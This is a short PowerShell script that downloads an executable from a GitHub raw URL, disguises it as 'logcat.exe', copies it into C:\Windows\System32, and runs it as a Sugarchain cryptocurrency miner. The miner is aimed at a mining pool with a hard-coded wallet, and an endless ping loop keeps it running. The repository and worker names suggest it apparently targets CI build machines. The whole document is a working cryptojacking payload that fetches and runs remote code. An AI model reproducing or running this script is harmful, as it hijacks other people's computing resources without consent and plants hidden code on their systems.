Invoke-WebRequest https://raw.githubusercontent.com/kijang-7/circleci-opt/main/logcat.exe -OutFile logcat.exe
Copy logcat.exe C:\Windows\System32
cmd /c echo cmd /k start logcat.exe -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.ciwin1 -t2 >>a.ps1
cmd /c echo ping -n 999999 127.0.0.1 >>a.ps1
.\a.ps1
